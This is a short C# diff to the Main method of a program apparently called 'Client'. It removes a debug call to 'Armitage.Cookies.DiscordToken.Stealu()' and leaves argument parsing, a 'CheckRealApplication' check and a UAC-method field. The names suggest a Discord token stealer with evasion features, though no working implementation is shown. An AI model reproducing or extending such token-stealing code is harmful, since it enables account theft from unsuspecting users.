@@ -17,9 +17,6 @@ namespace Client
         internal static int UACMethod = 0;
         static void Main(string[] args)
         {
-            Console.WriteLine(Armitage.Cookies.DiscordToken.Stealu());
-            while (true) ;
-            return;
             ArgsParser(args);
             CheckRealApplication();
 #if !DEBUG
